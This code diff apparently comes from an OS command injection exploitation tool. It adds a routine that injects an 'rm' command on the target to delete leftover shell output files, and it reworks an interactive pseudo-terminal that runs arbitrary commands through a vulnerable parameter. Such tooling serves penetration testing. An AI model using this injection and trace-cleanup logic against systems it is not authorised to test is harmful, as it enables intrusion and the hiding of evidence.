@@ -39,14 +39,24 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_pa
 from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_enumeration
 from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_file_access
 
+from src.core.injections.semiblind_based.techniques.file_based import fb_injector
+
 """
  The "tempfile-based" injection technique on Semiblind OS Command Injection.
  __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive results.
 """
 
-#-------------------------------------------------
-# The "tempfile-based" injection technique handler
-#-------------------------------------------------
+"""
+Delete previous shells outputs.
+"""
+def delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+  settings.SRV_ROOT_DIR = ""
+  cmd = "rm " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
+  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+
+"""
+The "tempfile-based" injection technique handler
+"""
 def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, url_time_response):
   
   counter = 1
@@ -169,6 +179,8 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
               sys.stdout.flush()
               
           except KeyboardInterrupt: 
+            # Delete previous shell (text) files (output) from /tmp
+            delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
             raise
           
           except:
@@ -255,6 +267,8 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                   elif enumerate_again in settings.CHOISE_NO: 
                     break
                   elif enumerate_again in settings.CHOISE_QUIT:
+                    # Delete previous shell (text) files (output) from /tmp
+                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)    
                     sys.exit(0)
                   else:
                     if enumerate_again == "":
@@ -275,6 +289,8 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                   elif file_access_again in settings.CHOISE_NO: 
                     break
                   elif file_access_again in settings.CHOISE_QUIT:
+                    # Delete previous shell (text) files (output) from /tmp
+                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                     sys.exit(0)
                   else:
                     if file_access_again == "":
@@ -283,68 +299,84 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                     pass
               else:
                 tfb_file_access.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-              
               # Check if defined single cmd.
               if menu.options.os_cmd:
                 check_how_long, output = tfb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 # Exploirt injection result
                 tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
-                sys.exit(0)     
-                  
-              # Pseudo-Terminal shell
-              go_back = False
-              while True:
-                if go_back == True:
-                  break
-                gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
-                if gotshell in settings.CHOISE_YES:
-                  print ""
-                  print "Pseudo-Terminal (type '?' for shell options)"
-                  while True:
-                    try:
-                      cmd = raw_input("Shell > ")
-                      if cmd.lower() in settings.SHELL_OPTIONS:
-                        if cmd == "?":
-                          menu.shell_options()
-                          continue
-                        elif cmd.lower() == "quit":
-                          sys.exit(0)
-                        elif cmd.lower() == "back":
-                          go_back = True
-                          if checks.check_next_attack_vector(technique, go_back) == True:
-                            break
-                          else:
-                            if no_result == True:
-                              return False 
-                            else:
-                              return True 
-                        else:
-                          pass
-                      else:
-                        print ""
-                        # The main command injection exploitation.
-                        check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-                        # Exploirt injection result
-                        tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
-                        
-                    except KeyboardInterrupt: 
-                      raise
-                elif gotshell in settings.CHOISE_NO:
-                  if checks.check_next_attack_vector(technique, go_back) == True:
-                    break
-                  else:
-                    if no_result == True:
-                      return False 
-                    else:
-                      return True  
+                # Delete previous shell (text) files (output) from /tmp
+                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                sys.exit(0)    
 
-                elif gotshell in settings.CHOISE_QUIT:
-                  sys.exit(0)
-                else:
-                  if gotshell == "":
-                    gotshell = "enter"
-                  print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
-                  pass 
+              try:    
+                # Pseudo-Terminal shell
+                go_back = False
+                while True:
+                  # Delete previous shell (text) files (output) from /tmp
+                  delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                  if menu.options.verbose:
+                  	print ""
+                  if go_back == True:
+                    break
+                  gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
+                  if gotshell in settings.CHOISE_YES:
+                    print ""
+                    print "Pseudo-Terminal (type '?' for shell options)"
+                    while True:
+                      try:
+                        cmd = raw_input("Shell > ")
+                        if cmd.lower() in settings.SHELL_OPTIONS:
+                          if cmd == "?":
+                            menu.shell_options()
+                            continue
+                          elif cmd.lower() == "quit":
+                            # Delete previous shell (text) files (output) from /tmp
+                            delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)                          
+                            sys.exit(0)
+                          elif cmd.lower() == "back":
+                            go_back = True
+                            if checks.check_next_attack_vector(technique, go_back) == True:
+                              break
+                            else:
+                              if no_result == True:
+                                return False 
+                              else:
+                                return True 
+                          else:
+                            pass
+                        else:
+                          print ""
+                          # The main command injection exploitation.
+                          check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                          # Exploirt injection result
+                          tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
+                      except KeyboardInterrupt: 
+                        # Delete previous shell (text) files (output) from /tmp
+                        delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                        raise
+                  elif gotshell in settings.CHOISE_NO:
+                    if checks.check_next_attack_vector(technique, go_back) == True:
+                      break
+                    else:
+                      if no_result == True:
+                        return False 
+                      else:
+                        # Delete previous shell (text) files (output) from /tmp
+                        delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                        return True  
+                  elif gotshell in settings.CHOISE_QUIT:
+                    # Delete previous shell (text) files (output) from /tmp
+                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                    sys.exit(0)
+                  else:
+                    if gotshell == "":
+                      gotshell = "enter"
+                    print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
+                    pass
+              except KeyboardInterrupt: 
+                # Delete previous shell (text) files (output) from /tmp
+                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                raise   
             break
     
   if no_result == True:
